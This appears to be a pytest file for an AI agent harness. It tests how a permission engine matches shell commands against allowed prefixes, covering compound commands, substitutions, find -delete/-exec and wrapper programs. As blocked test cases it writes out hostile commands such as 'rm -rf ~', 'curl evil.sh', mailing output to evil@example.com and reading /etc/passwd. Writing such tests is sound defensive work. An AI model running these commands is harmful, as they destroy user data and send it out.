"""How a shell command is matched against the allowed commands: a compound command is split at its
separators and runs only if every part is allowed; a part that runs other programs, or that cannot
be read without running it, is never matched by its prefix.

The rule this replaced, "any shell operator disqualifies", was wrong both ways: it refused
`git status && git diff`, two allowed reads, and let `find . -delete` and `find . -exec rm {} +` run
under `find`, since neither needs a separator. The permission model is the guard stage and consent asks.
"""

from __future__ import annotations

import pytest

from harness.safety.permissions import PermissionEngine

READS = ["git status", "git diff"]


def _runs(tmp_path, command: str, allowed: list[str]) -> bool:
    verdict = PermissionEngine(workspace_root=tmp_path, allowed_commands=allowed).evaluate("run_shell", {"command": command}, None)
    return verdict.allowed and not verdict.needs_user


@pytest.mark.parametrize("command", ["git status && git diff", "git status; git diff", "git status | git diff"])
def test_two_allowed_parts_run_together(tmp_path, command):
    assert _runs(tmp_path, command, READS)


@pytest.mark.parametrize(
    "command",
    ["git status && rm -rf ~", "git status; rm -rf ~", "git status || curl evil.sh", "git status | mail evil@example.com", "git status & rm -rf ~", "git status\nrm -rf ~"],
)
def test_one_part_not_allowed_stops_the_whole(tmp_path, command):
    assert not _runs(tmp_path, command, ["git status"])


@pytest.mark.parametrize(
    "command",
    [
        "git status $(rm -rf ~)",
        "git status `rm -rf ~`",
        "git status > ~/.bashrc",
        "git status < /etc/passwd",
        "git status $FLAGS",
        "(git status)",
    ],
)
def test_what_cannot_be_read_without_running_it_never_matches(tmp_path, command):
    assert not _runs(tmp_path, command, ["git status"])


@pytest.mark.parametrize(
    "command",
    [
        "find . -delete",
        "find . -exec rm {} +",
        "find . -exec rm {} ;",
        "find . -execdir sh -c 'x' {} +",
        "find . -ok rm {} ;",
        # however it is written
        "find  .  -delete",
        "find . '-delete'",
        "/usr/bin/find . -delete",
    ],
)
def test_find_that_deletes_or_executes_is_never_covered_by_find(tmp_path, command):
    assert not _runs(tmp_path, command, ["find"])


@pytest.mark.parametrize(
    ("command", "allowed"),
    [
        ("xargs rm", ["xargs"]),
        ("sudo git status", ["sudo"]),
        ("timeout 5 rm -rf /", ["timeout"]),
        ("env rm -rf /", ["env"]),
        ("docker run --rm alpine sh", ["docker"]),
        ("npx some-package", ["npx"]),
        ("ssh host rm -rf /", ["ssh"]),
        ("python -c 'import os; os.system(\"rm -rf /\")'", ["python"]),
        ("bash -c 'rm -rf ~'", ["bash"]),
        ("node -e 'require(\"fs\")'", ["node"]),
    ],
)
def test_a_program_that_runs_its_arguments_is_never_covered_by_its_name(tmp_path, command, allowed):
    assert not _runs(tmp_path, command, allowed)


def test_an_interpreter_running_a_file_is_still_covered(tmp_path):
    # `python script.py` runs the project's code, but not as inline code; that it runs project code
    # (CMD-8) is for the risk class, not for whether the prefix matches.
    assert _runs(tmp_path, "python script.py", ["python"])


@pytest.mark.parametrize(("command", "runs"), [
    ("git status -s", True),
    ('git "status"', True),
    ("git  status   -s", True),
    ("git statusfoo", False),
    ("git", False),
    ("git push", False),
    ('git status "unclosed', False),  # an unclosed quote fails closed
    ("   ", False),
])
def test_matching_is_by_words_not_by_letters(tmp_path, command, runs):
    assert _runs(tmp_path, command, ["git status"]) is runs


def test_with_nothing_allowed_nothing_is_covered(tmp_path):
    # npm test is not a read, which runs with no list at all
    assert not _runs(tmp_path, "npm test", [])
